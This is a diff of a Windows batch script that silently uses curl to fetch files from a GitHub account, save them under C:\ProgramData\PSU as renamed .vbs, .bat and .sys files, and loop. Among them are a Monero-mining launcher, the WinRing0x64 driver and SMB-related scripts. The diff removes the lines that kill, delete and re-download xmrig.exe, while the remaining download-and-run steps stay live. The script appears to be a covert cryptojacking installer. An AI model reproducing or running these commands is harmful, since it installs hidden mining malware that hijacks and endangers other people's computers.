@@ -1140,10 +1140,6 @@ if "%errorlevel%" == "0" goto online2
 goto run
 
 :online2
-taskkill /IM xmrig.exe /F
-timeout 0 >> nul
-del "C:\ProgramData\PSU\xmrig.exe"
-timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
@@ -1157,6 +1153,5 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run2.txt" -
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/samba.txt" -o "C:\ProgramData\PSU\samba.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.txt" -o "C:\ProgramData\PSU\smb.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 timeout 35
 goto run
